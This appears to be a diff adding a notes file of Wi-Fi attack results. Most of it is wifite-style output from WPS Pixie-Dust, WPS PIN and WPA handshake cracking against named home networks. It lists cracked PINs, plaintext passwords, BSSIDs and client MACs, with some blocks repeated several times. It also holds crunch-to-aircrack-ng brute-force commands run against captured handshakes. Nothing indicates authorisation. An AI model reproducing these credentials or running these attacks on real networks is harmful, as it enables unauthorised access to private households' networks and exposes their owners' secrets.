@@ -1,0 +1,238 @@
+MARIANA
+NET_123EE9
+10C25A123EE9
+Gerasolarte@102
+
+CLARO_2G6157F6 126157F6
+NET_2G1388E1 5C1388E1
+Paulo oi fibra 23031994 03021976 19862005
+lucia 34533453
+LEAL 87654321
+Joao pass Worcester
+NET_2GE7CACD 01907339
+Monteiro oi fibra 29366330 
+Maurício Oi Fibra Cracked WPS PIN: 54091450 pass 282931304
+Viviane 60:3D:26:5D:62:0F pass Cynthia1
+
+
+ [+] JORGE.JR 2G (44db) WPS PIN Attack: [9s PINs:1] Cracked WPS PIN: 12345670 PSK: dsl571719                                                                                                                      
+ [+]        ESSID: JORGE.JR 2G
+ [+]      Channel: 1
+ [+]        BSSID: 68:02:B8:CB:8D:C1
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 12345670
+ [+] PSK/Password: dsl571719
+
+
+
+ [+]        ESSID: CLARO_2GDB48A1
+ [+]      Channel: 1
+ [+]        BSSID: 68:02:B8:DC:1A:FE
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 00000000
+ [+] PSK/Password: B8DB48A1
+
+
+
+ [+] Monteiro oi fibra (12db) WPS Pixie-Dust: [4m55s] Cracked WPS PIN: 29366330 
+ [+]        ESSID: Monteiro oi [+]        ESSID: Quer_navegar_compre1                                           
+ [+]      Channel: 3
+ [+]        BSSID: BC:2E:48:D4:FF:1F
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 06849 fibra                                                  
+ [+]      Channel: 9
+ [+]        BSSID: 10:47:38:C5:65:B9
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 29366330
+
+
+ [+] NET_2GE7CACD (17db) WPS Pixie-Dust: [4m49s] Cracked WPS PIN 01907339                                     
+ [+] NET_2GE7CACD (17db) WPS Pixie-Dust: [1m59s] Cracked WPS PSK: DDE7CACD                                     
+ [+]        ESSID: NET_2GE7CACD                                                                    
+ [+]      Channel: 5
+ [+]        BSSID: 94:8F:CF:A6:30:14
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 01907339
+ [+] PSK/Password: DDE7CACD
+ 
+ crunch 8 8 ABCDEF1234567890 -t @@1388E1 | aircrack-ng handshake_NET2G1388E1_54-A6-5C-13-88-E6_2022-03-19T13-27-56.cap --bssid 54:A6:5C:13:88:E6 -w-
+Senha  5C1388E1
+
+
+crunch 8 8 ABCDEF1234567890 -t @@6157F6 | aircrack-ng handshake_CLARO2G6157F6_84-01-12-61-57-FB_2022-03-19T14-16-33.cap --bssid 84:01:12:61:57:FB -w-
+                           KEY FOUND! [ 126157F6 ]
+                           
+                           
+                            [+]        ESSID: Quer_navegar_compre1                                           
+ [+]      Channel: 3
+ [+]        BSSID: BC:2E:48:D4:FF:1F
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 06849                                                                                               
+ [+] (2/3) Starting attacks against 4C:D0:8A:E7:D0:EC (Ventura)                                     
+ [+] Ventura (8db) WPS Pixie-Dust: [4m51s] Failed: Reaver says "WPS pin not found"                  
+ [+] Ventura (16db) WPS NULL PIN: [4m21s] Failed: Reaver process stopped (exit code: 1)             
+ [+] Ventura (18db) WPS PIN Attack: [20s PINs:2] Failed: Because access point is Locked             
+ [!] Skipping PMKID attack, missing required tools: hcxdumptool, hcxpcapngtool
+ [+] Ventura (21db) WPA Handshake capture: Discovered new client: 0C:CB:85:BE:E0:74                 
+ [+] Ventura (15db) WPA Handshake capture: Discovered new client: F0:86:20:C2:C3:BE                 
+ [+] Ventura (17db) WPA Handshake capture: Captured handshake                                       
+ [+] saving copy of handshake to hs/handshake_Ventura_4C-D0-8A-E7-D0-EC_2022-03-26T23-31-06.cap saved                                                                                                   
+
+ [+] analysis of captured handshake file:
+ [+]   tshark: .cap file contains a valid handshake for 4c:d0:8a:e7:d0:ec
+ [!] aircrack: .cap file does not contain a valid handshake
+
+ [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
+ [+] Cracking WPA Handshake: 100.00% ETA: 0s @ 804.9kps (current key: 03021976)                     
+ [!] Failed to crack handshake: wordlist-probable.txt did not contain password
+                                                                                               
+ [+] (2/3) Starting attacks against 4C:D0:8A:E7:D0:EC (Ventura)                                     
+ [+] Ventura (8db) WPS Pixie-Dust: [4m51s] Failed: Reaver says "WPS pin not found"                  
+ [+] Ventura (16db) WPS NULL PIN: [4m21s] Failed: Reaver process stopped (exit code: 1)             
+ [+] Ventura (18db) WPS PIN Attack: [20s PINs:2] Failed: Because access point is Locked             
+ [!] Skipping PMKID attack, missing required tools: hcxdumptool, hcxpcapngtool
+ [+] Ventura (21db) WPA Handshake capture: Discovered new client: 0C:CB:85:BE:E0:74                 
+ [+] Ventura (15db) WPA Handshake capture: Discovered new client: F0:86:20:C2:C3:BE                 
+ [+] Ventura (17db) WPA Handshake capture: Captured handshake                                       
+ [+] saving copy of handshake to hs/handshake_Ventura_4C-D0-8A-E7-D0-EC_2022-03-26T23-31-06.cap saved                                                                                                   
+
+ [+] analysis of captured handshake file:
+ [+]   tshark: .cap file contains a valid handshake for 4c:d0:8a:e7:d0:ec
+ [!] aircrack: .cap file does not contain a valid handshake
+
+ [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
+ [+] Cracking WPA Handshake: 100.00% ETA: 0s @ 804.9kps (current key: 03021976)                     
+ [!] Failed to crack handshake: wordlist-probable.txt did not contain password
+                                                                                               
+ [+] (2/3) Starting attacks against 4C:D0:8A:E7:D0:EC (Ventura)                                     
+ [+] Ventura (8db) WPS Pixie-Dust: [4m51s] Failed: Reaver says "WPS pin not found"                  
+ [+] Ventura (16db) WPS NULL PIN: [4m21s] Failed: Reaver process stopped (exit code: 1)             
+ [+] Ventura (18db) WPS PIN Attack: [20s PINs:2] Failed: Because access point is Locked             
+ [!] Skipping PMKID attack, missing required tools: hcxdumptool, hcxpcapngtool
+ [+] Ventura (21db) WPA Handshake capture: Discovered new client: 0C:CB:85:BE:E0:74                 
+ [+] Ventura (15db) WPA Handshake capture: Discovered new client: F0:86:20:C2:C3:BE                 
+ [+] Ventura (17db) WPA Handshake capture: Captured handshake                                       
+ [+] saving copy of handshake to hs/handshake_Ventura_4C-D0-8A-E7-D0-EC_2022-03-26T23-31-06.cap saved                                                                                                   
+
+ [+] analysis of captured handshake file:
+ [+]   tshark: .cap file contains a valid handshake for 4c:d0:8a:e7:d0:ec
+ [!] aircrack: .cap file does not contain a valid handshake
+
+ [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
+ [+] Cracking WPA Handshake: 100.00% ETA: 0s @ 804.9kps (current key: 03021976)                     
+ [!] Failed to crack handshake: wordlist-probable.txt did not contain password
+
+
+
+ [+]        ESSID: Fabiana Oi Fibra                                               
+ [+]      Channel: 8
+ [+]        BSSID: 10:47:38:C3:4A:49
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 27985373
+ [+] PSK/Password: fks5939485
+ 
+ 
+ 
+ 
+ 
+ 
+                                                             
+                                                                                                
+ [+] (2/3) Starting attacks against 4C:D0:8A:E7:D0:EC (Ventura)                                     
+ [+] Ventura (8db) WPS Pixie-Dust: [4m51s] Failed: Reaver says "WPS pin not found"                  
+ [+] Ventura (16db) WPS NULL PIN: [4m21s] Failed: Reaver process stopped (exit code: 1)             
+ [+] Ventura (18db) WPS PIN Attack: [20s PINs:2] Failed: Because access point is Locked             
+ [!] Skipping PMKID attack, missing required tools: hcxdumptool, hcxpcapngtool
+ [+] Ventura (21db) WPA Handshake capture: Discovered new client: 0C:CB:85:BE:E0:74                 
+ [+] Ventura (15db) WPA Handshake capture: Discovered new client: F0:86:20:C2:C3:BE                 
+ [+] Ventura (17db) WPA Handshake capture: Captured handshake                                       
+ [+] saving copy of handshake to hs/handshake_Ventura_4C-D0-8A-E7-D0-EC_2022-03-26T23-31-06.cap saved                                                                                                   
+
+ [+] analysis of captured handshake file:
+ [+]   tshark: .cap file contains a valid handshake for 4c:d0:8a:e7:d0:ec
+ [!] aircrack: .cap file does not contain a valid handshake
+
+ [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
+ [+] Cracking WPA Handshake: 100.00% ETA: 0s @ 804.9kps (current key: 03021976)                     
+ [!] Failed to crack handshake: wordlist-probable.txt did not contain password
+
+
+
+
+ 
+ [+] saving copy of handshake to hs/handshake_Ventura_4C-D0-8A-E7-D0-EC_2022-03-26T23-31-06.cap saved                                                                                                    
+
+ [+] analysis of captured handshake file:
+ [+]   tshark: .cap file contains a valid handshake for 4c:d0:8a:e7:d0:ec
+ [!] aircrack: .cap file does not contain a valid handshake
+
+ [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
+ [+] Cracking WPA Handshake: 100.00% ETA: 0s @ 804.9kps (current key: 03021976)   
+ 
+ 
+ [+] saving copy of handshake to hs/handshake_Ventura_4C-D0-8A-E7-D0-EC_2022-03-26T23-31-06.cap saved                                                                                                    
+
+ [+] analysis of captured handshake file:
+ [+]   tshark: .cap file contains a valid handshake for 4c:d0:8a:e7:d0:ec
+ [!] aircrack: .cap file does not contain a valid handshake
+
+ [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
+ [+] Cracking WPA Handshake: 100.00% ETA: 0s @ 804.9kps (current key: 03021976)   
+
+
+
+ [+] (1/1) Starting attacks against 84:01:12:61:90:B8 (Roots_2G)
+ 
+ 
+ LISA
+ ] (1/1) Starting attacks against D4:AB:82:45:D1:69 (NET_2G36E7B0)
+ [+] NET_2G36E7B0 (30db) WPS Pixie-Dust: [4m53s] Cracked WPS PIN: 45982569        
+ [+] NET_2G36E7B0 (30db) WPS Pixie-Dust: [4m36s] Cracked WPS PSK: 6536E7B0        
+ [+]        ESSID: NET_2G36E7B0                                                   
+ [+]      Channel: 1
+ [+]        BSSID: D4:AB:82:45:D1:69
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 45982569
+ [+] PSK/Password: 6536E7B0
+
+FESTA JENIFER
+ [+]        ESSID: Kelly                                                                        
+ [+]      Channel: 8
+ [+]        BSSID: 5C:E3:0E:02:33:8C
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 48129459
+ [+] PSK/Password: 999210767
+
+ [+]        ESSID: NET_2GD3B203
+ [+]      Channel: 1
+ [+]        BSSID: 00:36:76:D3:B2:09
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 12345670
+ [+] PSK/Password: 76D3B203
+
+
+ [+]        ESSID: FamiliaMedeiros
+ [+]      Channel: 11
+ [+]        BSSID: B4:F2:67:55:E9:01
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 12345670
+ [+] PSK/Password: familiasararaJ13
+ 
+  [+] (1/1) Starting attacks against 50:02:38:EA:68:29 (EDUARDO_OIFIBRA)
+ [+] EDUARDO_OIFIBRA (35db) WPS Pixie-Dust: [4m55s] Cracked WPS PIN: 53620897 PSK: 16087702                               
+ [+]        ESSID: EDUARDO_OIFIBRA
+ [+]      Channel: 11
+ [+]        BSSID: 50:02:38:EA:68:29
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 53620897
+ [+] PSK/Password: 16087702
+
+  [+] (1/2) Starting attacks against 30:23:64:82:2D:D9 (Os Pereira Oi Fibra 2G)
+ [+] Os Pereira Oi Fibra 2G (26db) WPS Pixie-Dust: [4m54s] Cracked WPS PIN: 85314177 PSK: 06112511                        
+ [+]        ESSID: Os Pereira Oi Fibra 2G
+ [+]      Channel: 9
+ [+]        BSSID: 30:23:64:82:2D:D9
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 85314177
+ [+] PSK/Password: 06112511
+
